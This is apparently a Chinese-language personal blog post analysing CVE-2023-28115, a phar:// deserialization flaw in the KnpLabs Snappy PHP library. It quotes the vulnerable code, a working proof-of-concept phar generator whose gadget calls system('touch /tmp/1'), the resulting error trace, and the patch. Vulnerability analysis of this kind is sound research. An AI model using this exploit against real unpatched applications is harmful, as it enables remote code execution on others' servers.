{"title":"CVE-2023-28115","date":"2023-03-23T11:39:56.000Z","date_formatted":{"ll":"Mar 23, 2023","L":"03/23/2023","MM-DD":"03-23"},"link":"2023/03/23/CVE-2023-28115","updated":"2023-03-23T11:44:21.231Z","content":"<p>跟風一下 XD<br>\n一個滿簡單的漏洞，主要問題出在會跑到 <code>fileExists()</code> 這個 function 造成 <code>phar://</code> 協議反序列化攻擊<br>\n搭配上使用有問題的 class 就有機會造成 RCE 啦</p>\n<span id=\"more\"></span>\n<h2 id=\"cve-2023-28115\">CVE-2023-28115<a title=\"#cve-2023-28115\" href=\"#cve-2023-28115\"></a></h2>\n<ul>\n<li><a href=\"https://github.com/advisories/GHSA-gq6w-q6wh-jggc\" target=\"_blank\">https://github.com/advisories/GHSA-gq6w-q6wh-jggc</a></li>\n<li>有一個 <code>fileExists()</code> 的 function 會觸發 <code>phar://</code> 協議的反序列化</li>\n<li>在 <code>generateFromHtml()</code> 這個 function 會觸發上面的漏洞</li>\n<li>如果用的框架例如說 Laravel 之類的有反序列化的 POP chain 的話就會造成問題</li>\n</ul>\n<h3 id=\"漏洞分析\">漏洞分析<a title=\"#漏洞分析\" href=\"#漏洞分析\"></a></h3>\n<ul>\n<li>稍微追蹤一下 <code>/var/www/html/vendor/knplabs/knp-snappy/src/Knp/Snappy/AbstractGenerator.php</code></li>\n</ul>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">generateFromHtml</span>(<span class=\"params\"><span class=\"variable\">$html</span>, <span class=\"variable\">$output</span>, <span class=\"keyword\">array</span> <span class=\"variable\">$options</span> = [], <span class=\"variable\">$overwrite</span> = <span class=\"literal\">false</span></span>)</span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"variable\">$fileNames</span> = [];</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (\\<span class=\"title function_ invoke__\">is_array</span>(<span class=\"variable\">$html</span>)) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">foreach</span> (<span class=\"variable\">$html</span> <span class=\"keyword\">as</span> <span class=\"variable\">$htmlInput</span>) &#123;</span><br><span class=\"line\">      <span class=\"variable\">$fileNames</span>[] = <span class=\"variable language_\">$this</span>-&gt;<span class=\"title function_ invoke__\">createTemporaryFile</span>(<span class=\"variable\">$htmlInput</span>, <span class=\"string\">&#x27;html&#x27;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    <span class=\"variable\">$fileNames</span>[] = <span class=\"variable language_\">$this</span>-&gt;<span class=\"title function_ invoke__\">createTemporaryFile</span>(<span class=\"variable\">$html</span>, <span class=\"string\">&#x27;html&#x27;</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"variable language_\">$this</span>-&gt;<span class=\"title function_ invoke__\">generate</span>(<span class=\"variable\">$fileNames</span>, <span class=\"variable\">$output</span>, <span class=\"variable\">$options</span>, <span class=\"variable\">$overwrite</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<ul>\n<li><code>createTemporaryFile</code> 不是很重要</li>\n</ul>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">generate</span>(<span class=\"params\"><span class=\"variable\">$input</span>, <span class=\"variable\">$output</span>, <span class=\"keyword\">array</span> <span class=\"variable\">$options</span> = [], <span class=\"variable\">$overwrite</span> = <span class=\"literal\">false</span></span>)</span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"variable language_\">$this</span>-&gt;<span class=\"title function_ invoke__\">prepareOutput</span>(<span class=\"variable\">$output</span>, <span class=\"variable\">$overwrite</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"variable\">$command</span> = <span class=\"variable language_\">$this</span>-&gt;<span class=\"title function_ invoke__\">getCommand</span>(<span class=\"variable\">$input</span>, <span class=\"variable\">$output</span>, <span class=\"variable\">$options</span>);</span><br><span class=\"line\">  <span class=\"comment\">// print_r($command);</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"variable\">$inputFiles</span> = \\<span class=\"title function_ invoke__\">is_array</span>(<span class=\"variable\">$input</span>) ? \\<span class=\"title function_ invoke__\">implode</span>(<span class=\"string\">&#x27;&quot;, &quot;&#x27;</span>, <span class=\"variable\">$input</span>) : <span class=\"variable\">$input</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (<span class=\"literal\">null</span> !== <span class=\"variable language_\">$this</span>-&gt;logger) &#123;</span><br><span class=\"line\">    <span class=\"variable language_\">$this</span>-&gt;logger-&gt;<span class=\"title function_ invoke__\">info</span>(\\<span class=\"title function_ invoke__\">sprintf</span>(<span class=\"string\">&#x27;Generate from file(s) &quot;%s&quot; to file &quot;%s&quot;.&#x27;</span>, <span class=\"variable\">$inputFiles</span>, <span class=\"variable\">$output</span>), [</span><br><span class=\"line\">      <span class=\"string\">&#x27;command&#x27;</span> =&gt; <span class=\"variable\">$command</span>,</span><br><span class=\"line\">      <span class=\"string\">&#x27;env&#x27;</span> =&gt; <span class=\"variable\">$this</span>-&gt;env,</span><br><span class=\"line\">      <span class=\"string\">&#x27;timeout&#x27;</span> =&gt; <span class=\"variable\">$this</span>-&gt;timeout,</span><br><span class=\"line\">    ]);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">list</span>(<span class=\"variable\">$status</span>, <span class=\"variable\">$stdout</span>, <span class=\"variable\">$stderr</span>) = <span class=\"variable language_\">$this</span>-&gt;<span class=\"title function_ invoke__\">executeCommand</span>(<span class=\"variable\">$command</span>);</span><br><span class=\"line\">    <span class=\"variable language_\">$this</span>-&gt;<span class=\"title function_ invoke__\">checkProcessStatus</span>(<span class=\"variable\">$status</span>, <span class=\"variable\">$stdout</span>, <span class=\"variable\">$stderr</span>, <span class=\"variable\">$command</span>);</span><br><span class=\"line\">    <span class=\"variable language_\">$this</span>-&gt;<span class=\"title function_ invoke__\">checkOutput</span>(<span class=\"variable\">$output</span>, <span class=\"variable\">$command</span>);</span><br><span class=\"line\">  &#125; <span class=\"keyword\">catch</span> (<span class=\"built_in\">Exception</span> <span class=\"variable\">$e</span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"literal\">null</span> !== <span class=\"variable language_\">$this</span>-&gt;logger) &#123;</span><br><span class=\"line\">      <span class=\"variable language_\">$this</span>-&gt;logger-&gt;<span class=\"title function_ invoke__\">error</span>(\\<span class=\"title function_ invoke__\">sprintf</span>(<span class=\"string\">&#x27;An error happened while generating &quot;%s&quot;.&#x27;</span>, <span class=\"variable\">$output</span>), [</span><br><span class=\"line\">        <span class=\"string\">&#x27;command&#x27;</span> =&gt; <span class=\"variable\">$command</span>,</span><br><span class=\"line\">        <span class=\"string\">&#x27;status&#x27;</span> =&gt; <span class=\"variable\">$status</span> ?? <span class=\"literal\">null</span>,</span><br><span class=\"line\">        <span class=\"string\">&#x27;stdout&#x27;</span> =&gt; <span class=\"variable\">$stdout</span> ?? <span class=\"literal\">null</span>,</span><br><span class=\"line\">        <span class=\"string\">&#x27;stderr&#x27;</span> =&gt; <span class=\"variable\">$stderr</span> ?? <span class=\"literal\">null</span>,</span><br><span class=\"line\">      ]);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">throw</span> <span class=\"variable\">$e</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (<span class=\"literal\">null</span> !== <span class=\"variable language_\">$this</span>-&gt;logger) &#123;</span><br><span class=\"line\">    <span class=\"variable language_\">$this</span>-&gt;logger-&gt;<span class=\"title function_ invoke__\">info</span>(\\<span class=\"title function_ invoke__\">sprintf</span>(<span class=\"string\">&#x27;File &quot;%s&quot; has been successfully generated.&#x27;</span>, <span class=\"variable\">$output</span>), [</span><br><span class=\"line\">      <span class=\"string\">&#x27;command&#x27;</span> =&gt; <span class=\"variable\">$command</span>,</span><br><span class=\"line\">      <span class=\"string\">&#x27;stdout&#x27;</span> =&gt; <span class=\"variable\">$stdout</span>,</span><br><span class=\"line\">      <span class=\"string\">&#x27;stderr&#x27;</span> =&gt; <span class=\"variable\">$stderr</span>,</span><br><span class=\"line\">    ]);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<ul>\n<li>有關 command execute 相關的 function 我有追了一下子，是沒有問題的，有用 <code>escapeshellarg</code> 做防護</li>\n<li>主要問題出在 <code>prepareOutput</code> 這個 function</li>\n</ul>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">protected</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">prepareOutput</span>(<span class=\"params\"><span class=\"variable\">$filename</span>, <span class=\"variable\">$overwrite</span></span>)</span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"variable\">$directory</span> = \\<span class=\"title function_ invoke__\">dirname</span>(<span class=\"variable\">$filename</span>);</span><br><span class=\"line\">  <span class=\"title function_ invoke__\">print_r</span>(<span class=\"variable\">$filename</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (<span class=\"variable language_\">$this</span>-&gt;<span class=\"title function_ invoke__\">fileExists</span>(<span class=\"variable\">$filename</span>)) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!<span class=\"variable language_\">$this</span>-&gt;<span class=\"title function_ invoke__\">isFile</span>(<span class=\"variable\">$filename</span>)) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"built_in\">InvalidArgumentException</span>(\\<span class=\"title function_ invoke__\">sprintf</span>(<span class=\"string\">&#x27;The output file \\&#x27;%s\\&#x27; already exists and it is a %s.&#x27;</span>, <span class=\"variable\">$filename</span>, <span class=\"variable\">$this</span>-&gt;<span class=\"title function_ invoke__\">isDir</span>(<span class=\"variable\">$filename</span>) ? <span class=\"string\">&#x27;directory&#x27;</span> : <span class=\"string\">&#x27;link&#x27;</span>));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"literal\">false</span> === <span class=\"variable\">$overwrite</span>) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"title class_\">FileAlreadyExistsException</span>(\\<span class=\"title function_ invoke__\">sprintf</span>(<span class=\"string\">&#x27;The output file \\&#x27;%s\\&#x27; already exists.&#x27;</span>, <span class=\"variable\">$filename</span>));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!<span class=\"variable language_\">$this</span>-&gt;<span class=\"title function_ invoke__\">unlink</span>(<span class=\"variable\">$filename</span>)) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"built_in\">RuntimeException</span>(\\<span class=\"title function_ invoke__\">sprintf</span>(<span class=\"string\">&#x27;Could not delete already existing output file \\&#x27;%s\\&#x27;.&#x27;</span>, <span class=\"variable\">$filename</span>));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125; <span class=\"keyword\">elseif</span> (!<span class=\"variable language_\">$this</span>-&gt;<span class=\"title function_ invoke__\">isDir</span>(<span class=\"variable\">$directory</span>) &amp;&amp; !<span class=\"variable language_\">$this</span>-&gt;<span class=\"title function_ invoke__\">mkdir</span>(<span class=\"variable\">$directory</span>)) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"built_in\">RuntimeException</span>(\\<span class=\"title function_ invoke__\">sprintf</span>(<span class=\"string\">&#x27;The output file\\&#x27;s directory \\&#x27;%s\\&#x27; could not be created.&#x27;</span>, <span class=\"variable\">$directory</span>));</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<ul>\n<li>關鍵的地方在 <code>if ($this-&gt;fileExists($filename))</code></li>\n</ul>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"comment\">// index.php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// include autoloader</span></span><br><span class=\"line\"><span class=\"keyword\">require</span> <span class=\"keyword\">__DIR__</span> . <span class=\"string\">&#x27;/vendor/autoload.php&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// reference the snappy namespace</span></span><br><span class=\"line\"><span class=\"keyword\">use</span> <span class=\"title\">Knp</span>\\<span class=\"title\">Snappy</span>\\<span class=\"title\">Pdf</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// vulnerable object</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">VulnerableClass</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$fileName</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$callback</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__wakeup</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"title function_ invoke__\">call_user_func</span>(<span class=\"variable\">$this</span>-&gt;callback, <span class=\"variable\">$this</span>-&gt;fileName);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$snappy</span> = <span class=\"keyword\">new</span> <span class=\"title class_\">Pdf</span>(<span class=\"string\">&#x27;/usr/local/bin/wkhtmltopdf&#x27;</span>);</span><br><span class=\"line\"><span class=\"comment\">// generate pdf from html content and save it at phar://poc.phar</span></span><br><span class=\"line\"><span class=\"variable\">$snappy</span>-&gt;<span class=\"title function_ invoke__\">generateFromHtml</span>(<span class=\"string\">&#x27;&lt;h1&gt;Bill&lt;/h1&gt;&lt;p&gt;You owe me money, dude.&lt;/p&gt;&#x27;</span>, <span class=\"string\">&#x27;phar:///var/www/html/poc.phar&#x27;</span>);</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"comment\">// generate_phar.php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">VulnerableClass</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$fileName</span> = <span class=\"string\">&quot;touch /tmp/1&quot;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"variable\">$callback</span> = <span class=\"string\">&quot;system&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__wakeup</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"title function_ invoke__\">call_user_func</span>(<span class=\"variable\">$this</span>-&gt;callback, <span class=\"variable\">$this</span>-&gt;fileName);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">// Create a new instance of the Dummy class and modify its property</span></span><br><span class=\"line\"><span class=\"variable\">$dummy</span> = <span class=\"keyword\">new</span> <span class=\"title class_\">VulnerableClass</span>();</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// Delete any existing PHAR archive with that name</span></span><br><span class=\"line\">@<span class=\"title function_ invoke__\">unlink</span>(<span class=\"string\">&quot;poc.phar&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// Create a new archive</span></span><br><span class=\"line\"><span class=\"variable\">$poc</span> = <span class=\"keyword\">new</span> <span class=\"title class_\">Phar</span>(<span class=\"string\">&quot;poc.phar&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// Add all write operations to a buffer, without modifying the archive on disk</span></span><br><span class=\"line\"><span class=\"variable\">$poc</span>-&gt;<span class=\"title function_ invoke__\">startBuffering</span>();</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// Set the stub</span></span><br><span class=\"line\"><span class=\"variable\">$poc</span>-&gt;<span class=\"title function_ invoke__\">setStub</span>(<span class=\"string\">&quot;&lt;?php echo &#x27;Here is the STUB!&#x27;; __HALT_COMPILER();&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// Add a new file in the archive with &quot;text&quot; as its content</span></span><br><span class=\"line\"><span class=\"variable\">$poc</span>[<span class=\"string\">&quot;file&quot;</span>] = <span class=\"string\">&quot;text&quot;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// Add the dummy object to the metadata. This will be serialized</span></span><br><span class=\"line\"><span class=\"variable\">$poc</span>-&gt;<span class=\"title function_ invoke__\">setMetadata</span>(<span class=\"variable\">$dummy</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// Stop buffering and write changes to disk</span></span><br><span class=\"line\"><span class=\"variable\">$poc</span>-&gt;<span class=\"title function_ invoke__\">stopBuffering</span>();</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>我有稍微改一下作者的 poc，因為他的我 run 不起來 w</li>\n<li>用 <code>__wakeup</code> magic method 當反序列成功就會跑裡面的扣</li>\n<li>如果是用回報者給的 PoC 會發現說還沒有 destruct 就因為丟出的 error message 而整個 proccess 被停掉</li>\n<li>結果就是會報錯，但是他還是會吃到 <code>phar://</code> 協議</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Fatal error: Uncaught InvalidArgumentException: The output file <span class=\"string\">&#x27;phar:///var/www/html/poc.phar&#x27;</span> already exists and it is a directory. <span class=\"keyword\">in</span> /var/www/html/vendor/knplabs/knp-snappy/src/Knp/Snappy/AbstractGenerator.php:631</span><br><span class=\"line\">Stack trace:</span><br><span class=\"line\"><span class=\"comment\">#0 /var/www/html/vendor/knplabs/knp-snappy/src/Knp/Snappy/AbstractGenerator.php(178): Knp\\Snappy\\AbstractGenerator-&gt;prepareOutput(&#x27;phar:///var/www...&#x27;, false)</span></span><br><span class=\"line\"><span class=\"comment\">#1 /var/www/html/vendor/knplabs/knp-snappy/src/Knp/Snappy/Pdf.php(36): Knp\\Snappy\\AbstractGenerator-&gt;generate(Array, &#x27;phar:///var/www...&#x27;, Array, false)</span></span><br><span class=\"line\"><span class=\"comment\">#2 /var/www/html/vendor/knplabs/knp-snappy/src/Knp/Snappy/AbstractGenerator.php(233): Knp\\Snappy\\Pdf-&gt;generate(Array, &#x27;phar:///var/www...&#x27;, Array, false)</span></span><br><span class=\"line\"><span class=\"comment\">#3 /var/www/html/index.php(22): Knp\\Snappy\\AbstractGenerator-&gt;generateFromHtml(&#x27;&lt;h1&gt;Bill&lt;/h1&gt;&lt;p...&#x27;, &#x27;phar:///var/www...&#x27;)</span></span><br><span class=\"line\"><span class=\"comment\">#4 &#123;main&#125;</span></span><br><span class=\"line\">  thrown <span class=\"keyword\">in</span> /var/www/html/vendor/knplabs/knp-snappy/src/Knp/Snappy/AbstractGenerator.php on line 631</span><br></pre></td></tr></table></figure>\n<ul>\n<li>在 <code>/tmp</code> 目錄下也會出現一個 <code>1</code> 的 file</li>\n<li>可能的攻擊面就是攻擊者上傳一個 phar 檔案，如果可以控 <code>$output</code> 的話就可以讓他吃 <code>phar://</code> 造成反序列化</li>\n<li>至於他修的方法如下</li>\n</ul>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">protected</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">prepareOutput</span>(<span class=\"params\"><span class=\"variable\">$filename</span>, <span class=\"variable\">$overwrite</span></span>)</span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (\\<span class=\"title function_ invoke__\">strpos</span>(<span class=\"variable\">$filename</span>, <span class=\"string\">&#x27;phar://&#x27;</span>) === <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"built_in\">InvalidArgumentException</span>(<span class=\"string\">&#x27;The output file cannot be a phar archive.&#x27;</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"variable\">$directory</span> = \\<span class=\"title function_ invoke__\">dirname</span>(<span class=\"variable\">$filename</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (<span class=\"variable language_\">$this</span>-&gt;<span class=\"title function_ invoke__\">fileExists</span>(<span class=\"variable\">$filename</span>)) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!<span class=\"variable language_\">$this</span>-&gt;<span class=\"title function_ invoke__\">isFile</span>(<span class=\"variable\">$filename</span>)) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"built_in\">InvalidArgumentException</span>(\\<span class=\"title function_ invoke__\">sprintf</span>(<span class=\"string\">&#x27;The output file \\&#x27;%s\\&#x27; already exists and it is a %s.&#x27;</span>, <span class=\"variable\">$filename</span>, <span class=\"variable\">$this</span>-&gt;<span class=\"title function_ invoke__\">isDir</span>(<span class=\"variable\">$filename</span>) ? <span class=\"string\">&#x27;directory&#x27;</span> : <span class=\"string\">&#x27;link&#x27;</span>));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"literal\">false</span> === <span class=\"variable\">$overwrite</span>) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"title class_\">FileAlreadyExistsException</span>(\\<span class=\"title function_ invoke__\">sprintf</span>(<span class=\"string\">&#x27;The output file \\&#x27;%s\\&#x27; already exists.&#x27;</span>, <span class=\"variable\">$filename</span>));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!<span class=\"variable language_\">$this</span>-&gt;<span class=\"title function_ invoke__\">unlink</span>(<span class=\"variable\">$filename</span>)) &#123;</span><br><span class=\"line\">      <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"built_in\">RuntimeException</span>(\\<span class=\"title function_ invoke__\">sprintf</span>(<span class=\"string\">&#x27;Could not delete already existing output file \\&#x27;%s\\&#x27;.&#x27;</span>, <span class=\"variable\">$filename</span>));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125; <span class=\"keyword\">elseif</span> (!<span class=\"variable language_\">$this</span>-&gt;<span class=\"title function_ invoke__\">isDir</span>(<span class=\"variable\">$directory</span>) &amp;&amp; !<span class=\"variable language_\">$this</span>-&gt;<span class=\"title function_ invoke__\">mkdir</span>(<span class=\"variable\">$directory</span>)) &#123;</span><br><span class=\"line\">    <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"built_in\">RuntimeException</span>(\\<span class=\"title function_ invoke__\">sprintf</span>(<span class=\"string\">&#x27;The output file\\&#x27;s directory \\&#x27;%s\\&#x27; could not be created.&#x27;</span>, <span class=\"variable\">$directory</span>));</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<ul>\n<li>有趣 w</li>\n</ul>\n","next":{"title":"CVE-2019-6339","link":"2023/03/21/CVE-2019-6339"},"plink":"https://entroychang.github.io/2023/03/23/CVE-2023-28115/","toc":[{"id":"cve-2023-28115","title":"CVE-2023-28115","index":"1","children":[{"id":"漏洞分析","title":"漏洞分析","index":"1.1"}]}],"reading_time":"1203 words in 8 min"}